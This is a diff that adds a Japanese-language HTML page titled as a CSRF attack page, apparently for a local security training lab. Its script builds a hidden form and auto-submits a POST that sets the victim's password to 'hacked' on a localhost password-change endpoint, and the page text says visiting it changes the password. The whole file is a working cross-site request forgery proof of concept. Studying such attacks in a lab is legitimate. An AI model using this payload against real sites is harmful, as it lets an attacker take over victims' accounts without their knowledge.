@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF攻撃</title>
+</head>
+<body>
+    <h1>CSRF攻撃ページ</h1>
+    <p>このページを訪れると、自動的にパスワードが「hacked」に変更されます。</p>
+    <a href="#" onclick="csrfAttack()">ここをクリックするとCSRF攻撃が実行されます</a>
+
+    <script>
+        function csrfAttack() {
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'http://localhost:6001/1/password_change_result.php';
+            
+            const input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = 'new_password';
+            input.value = 'hacked';
+            
+            form.appendChild(input);
+            document.body.appendChild(form);
+            form.submit();
+        }
+    </script>
+</body>
+</html>
